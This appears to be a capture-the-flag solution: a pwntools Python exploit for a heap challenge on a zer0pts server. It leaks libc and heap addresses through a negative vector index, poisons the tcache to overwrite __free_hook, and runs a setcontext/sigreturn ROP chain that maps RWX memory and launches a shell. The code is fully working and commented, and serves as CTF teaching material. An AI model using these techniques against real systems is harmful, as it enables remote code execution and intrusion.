#!/usr/bin/env python3

import functools

from io import BytesIO
from pwn import *

the_binary = "./chall"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("pwn.ctf.zer0pts.com", 9001)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary, env={"LD_PRELOAD": libc.path})

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        dir /usr/src/glibc/glibc-2.31/malloc/
        continue
    """)

def push_back(val):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("value: ", str(val))

def pop_back():
    io.sendlineafter(">> ", "2")

def store(idx, val):
    # Target program is reading into a 32-bit signed int; need to ensure we
    # don't exceed this value
    if val > 0x7fffffff:
        val = u32(p32(val), sign="signed")

    io.sendlineafter(">> ", "3")
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("value: ", str(val))

def store64(offset, what):
    store(offset+1, what >> 0x20)
    store(offset, what & 0xffffffff)

def load(idx):
    io.sendlineafter(">> ", "4")
    io.sendlineafter("index: ", str(idx))
    io.recvuntil("value: ")
    return int(io.recvuntil("\n", drop=True))

def wipe():
    io.sendlineafter(">> ", "5")

# Get a libc pointer on the heap via a smallbin chunk.
for i in range(0x310):
    push_back(0x41414141)

# Abuse negative (index % size) result in [] operator to read the libc pointer
# stored in the previous chunk on the heap.
libc_leak = (load(-0x203) << 0x20) + load(-0x204)
libc.address = libc_leak - 0x1ebbe0
log.success("libc base: %#x" % libc.address)

# Do the same to leak a heap pointer.
heap_leak = (load(-0x305) << 0x20) + load(-0x306)
heap_base = heap_leak - 0x10
log.success("heap base: %#x" % heap_base)

class Gadgets:
    # 0x0000000000066229: syscall; ret;
    syscall = libc.address + 0x66229

    # 0x000000000005e7a2: mov rdi, rax; cmp rdx, rcx; jae 0x5e78c; mov rax, r8; ret;
    mov_rdi_rax = libc.address + 0x5e7a2

    # 0x000000000011c371: pop rdx; pop r12; ret;
    pop_rdx_pop_r12 = libc.address + 0x11c371

    # 0x0000000000026b72: pop rdi; ret;
    pop_rdi = libc.address + 0x26b72

    # 0x0000000000027529: pop rsi; ret;
    pop_rsi = libc.address + 0x27529

    # 0x000000000004a550: pop rax; ret;
    pop_rax = libc.address + 0x4a550

    # 0x0000000000045197: push rax; ret;
    push_rax = libc.address + 0x45197

    # 0x0000000000026e91: jmp rax;
    jmp_rax = libc.address + 0x26e91

# With leaks in hand, we can start setting the stage for the eventual stack
# pivot onto the heap.
#
# Since we created a large chunk on the heap to get libc pointers linked in,
# we can start filling it in with a sigreturn-based rop chain. This abuses
# the libc sigreturn-restoring functionality found in the setcontext function.
#
# setcontext:
# ... snip ...
# 000580dd  488ba2a0000000     mov     rsp, qword [rdx+0xa0]  ; this is setcontext+0x3d
# 000580e4  488b9a80000000     mov     rbx, qword [rdx+0x80]
# 000580eb  488b6a78           mov     rbp, qword [rdx+0x78]
# 000580ef  4c8b6248           mov     r12, qword [rdx+0x48]
# 000580f3  4c8b6a50           mov     r13, qword [rdx+0x50]
# 000580f7  4c8b7258           mov     r14, qword [rdx+0x58]
# 000580fb  4c8b7a60           mov     r15, qword [rdx+0x60]
# 000580ff  64f7042548000000…  test    dword [fs:0x48], 0x2
# 0005810b  0f84b5000000       je      0x581c6
# ... snip ...
# 000581c6  488b8aa8000000     mov     rcx, qword [rdx+0xa8]
# 000581cd  51                 push    rcx
# 000581ce  488b7270           mov     rsi, qword [rdx+0x70]
# 000581d2  488b7a68           mov     rdi, qword [rdx+0x68]
# 000581d6  488b8a98000000     mov     rcx, qword [rdx+0x98]
# 000581dd  4c8b4228           mov     r8, qword [rdx+0x28]
# 000581e1  4c8b4a30           mov     r9, qword [rdx+0x30]
# 000581e5  488b9288000000     mov     rdx, qword [rdx+0x88]
# 000581ec  31c0               xor     eax, eax  {0x0}
# 000581ee  c3                 retn    
rop_addr = heap_base + 0x12f40 + 0x10
rwx_addr = 0xdead0000
srop = SigreturnFrame()
# The below line is setting offset 0x20 of the frame to the address of the
# function we will eventualy call, which is the portion of setcontext that will
# load the remainder of the register values at other offsets of rdx. Because
# all this register-loading is just libc's implementation of restoring a saved
# context from a sigreturn, we can use pwntools's SigreturnFrame helper to put
# the desired register values at the appropriate offsets.
srop["uc_stack.ss_size"] = libc.sym.setcontext + 0x3d
# Set the stack pointer so that we can continue ropping after calling an
# arbitrary function via the sigreturn context.
srop.rsp = rop_addr + len(bytes(srop))
# Setup the other registers required for allocating rwx memory via mmap
srop.rsi = 0x1000
srop.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
srop.rcx = constants.MAP_PRIVATE | constants.MAP_ANON | constants.MAP_FIXED
srop.rdi = rwx_addr
srop.rip = libc.sym.mmap

shellcode = b""
shellcode += asm(shellcraft.echo("\n\nRunning arbitrary shellcode...\n\n\n"))
shellcode += asm(shellcraft.sh())

rop = b""
rop += bytes(srop)
rop += flat([
    Gadgets.pop_rsi,
    rwx_addr,

    Gadgets.pop_rdi,
    0,  # stdin

    Gadgets.pop_rdx_pop_r12,
    len(shellcode),
    0xdeadbeefcafebabe,

    Gadgets.pop_rax,
    constants.SYS_read,
    Gadgets.syscall,

    Gadgets.pop_rax,
    rwx_addr,    
    Gadgets.jmp_rax
])

# We now store this sigreturn frame (from which we will eventually load the
# execution context) in the big chunk we've allocated on the heap. We start
# storing it at an offset from the start of the chunk to avoid the fd and bk
# pointers that will be written there when the chunk is freed.
rop_f = BytesIO(bytes(rop))
reader = functools.partial(rop_f.read, 4)
for i, word in enumerate(iter(reader, b"")):
    word = u32(word, sign="signed")
    store(i+4, word)
log.success("Stored sigreturn frame on heap at %#x" % rop_addr)

wipe()
for i in range(0x40):
    push_back(0x42430000 + i)

# Edit previous chunk's size so it points into the middle of the 0x110-sized
# chunk where pushed entries are currently being stored.
store(-2, 0x51)

# Edit the size of the fake chunk where the edited size now points; we are
# effectively splitting the original 0x110-sized chunk into a 0x50-sized chunk
# and a 0xc0-sized chunk.
store64(0x12, 0x111 - 0x50)

# Trigger a vector re-size, which causes the chunk with size 0x50 size to be
# freed and added to the tcache bin that already has an entry (so we now have
# count == 2 in this bin).
for i in range(0x40):
    push_back(0x44450000 + i)

# We now edit the fd pointer of the (modified size) 0x50 chunk that is at the
# head of the 0x50 tcache bin, so that it points to __free_hook.
store64(-0x44, libc.sym.__free_hook)

# We now wipe and re-populate enough entries to request a chunk from the 0x50-
# size tcache bin. This now positions __free_hook at the head of the 0x50
# list.
wipe()
for i in range(0x10):
    push_back(0x46470000 + i)

# Edit the size of the chunk again so that the subsequent free doesn't put
# something else at the head of the 0x50 tcache list; we are effectively
# reparing the original 0x110-sized chunk that we had split up before.
store(-0x2, 0x111)
wipe()

# We now have __free_hook as the next chunk in the 0x50-sized tcache bin:
# Tcachebins[idx=3, size=0x50] count=1  ←  Chunk(addr=0x7fc47add9b28, size=0x0, flags=)
#
# We now store enough new entries to free the (size-edited) 0x110 chunk.
for i in range(0x8):
    push_back(0x48490000 + i)

# Since these entries will be copied over to the fake __free_hook chunk served
# when our data is moved up into a 0x50-sized chunk, we edit the beginning
# of the data to be the value with which we want to overwrite __free_hook.
#
# We are overwriting __free_hook with an indirect call gadget:
# 0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
#
# This can be found (with some digging) with ropper:
# ropper --nocolor --file ./libc.so.6 --type jop | grep 'call qword ptr \[rdx + 0x20\]'
store64(0, libc.address + 0x154930)
# Because our gadget allows us to call an arbitrary function whose address is
# stored at an offset from rdi (which points to the chunk-to-be-freed at the
# time __free_hook is called), we must also specify this address in the
# 8-bytes of heap memory immediately following __free_hook in memory.
store64(2, rop_addr)

# Now append another item, triggering the upgrade to a 0x50-sized chunk and
# subsequent free, which will call the overwritten __free_hook.
push_back(0x48490009)

io.send(shellcode)
io.interactive()
